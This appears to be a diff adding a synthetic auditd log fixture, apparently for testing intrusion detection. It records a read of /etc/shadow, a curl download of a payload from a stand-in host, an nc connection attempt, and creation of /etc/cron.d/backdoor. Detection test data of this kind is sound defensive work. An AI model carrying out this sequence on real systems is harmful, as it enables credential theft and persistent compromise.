@@ -1,0 +1,12 @@
+type=SYSCALL msg=audit(1700000000.505:805): arch=c000003e syscall=257 success=yes exit=3 items=1 ppid=1200 pid=1205 auid=1000 uid=1000 comm="cat" exe="/usr/bin/cat" key="shadow-watch"
+type=CWD msg=audit(1700000000.505:805): cwd="/home/analyst"
+type=PATH msg=audit(1700000000.505:805): item=0 name="/etc/shadow" inode=1234 dev=fd:00 mode=0100640 nametype=NORMAL
+type=SYSCALL msg=audit(1700000000.606:806): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=1200 pid=1300 auid=1000 uid=1000 comm="curl" exe="/usr/bin/curl" key="exec"
+type=EXECVE msg=audit(1700000000.606:806): argc=3 a0="curl" a1="-O" a2="http://192.0.2.10/payload"
+type=SYSCALL msg=audit(1700000000.707:807): arch=c000003e syscall=42 success=yes exit=0 ppid=1200 pid=1300 auid=1000 uid=1000 comm="curl" exe="/usr/bin/curl" key="net"
+type=SOCKADDR msg=audit(1700000000.707:807): saddr=0200115CC000020A
+type=SYSCALL msg=audit(1700000000.808:808): arch=c000003e syscall=42 success=no exit=-115 ppid=1200 pid=1301 auid=1000 uid=1000 comm="nc" exe="/usr/bin/nc" key="net"
+type=SOCKADDR msg=audit(1700000000.808:808): saddr=0200115CC000020B
+type=SYSCALL msg=audit(1700000000.909:809): arch=c000003e syscall=257 success=yes exit=4 items=2 ppid=1200 pid=1302 auid=0 uid=0 comm="tee" exe="/usr/bin/tee" key="cron-watch"
+type=PATH msg=audit(1700000000.909:809): item=0 name="/etc/cron.d" nametype=PARENT
+type=PATH msg=audit(1700000000.909:809): item=1 name="/etc/cron.d/backdoor" nametype=CREATE
